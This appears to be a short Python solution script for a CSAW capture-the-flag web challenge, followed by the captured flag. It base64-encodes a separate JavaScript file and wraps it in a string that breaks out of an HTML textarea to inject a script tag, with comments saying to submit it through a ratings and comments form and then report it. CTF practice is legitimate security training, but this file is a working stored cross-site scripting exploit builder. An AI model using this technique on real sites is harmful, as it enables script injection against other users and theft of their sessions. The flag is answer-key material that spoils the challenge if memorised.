import base64

with open("xss-payload.js", "r") as f:
    payload = f.read()

payload = payload.replace("\n", "")
payload = base64.b64encode(payload.encode()).decode()
payload = f'</textarea><script src="data:text/javascript;base64,{payload}"></script><textarea>'
print(payload)

# Submit Ratings & Comments, and then report

# csawctf{y0u_m@de_the_h@cking_h0n0r_r0ll}
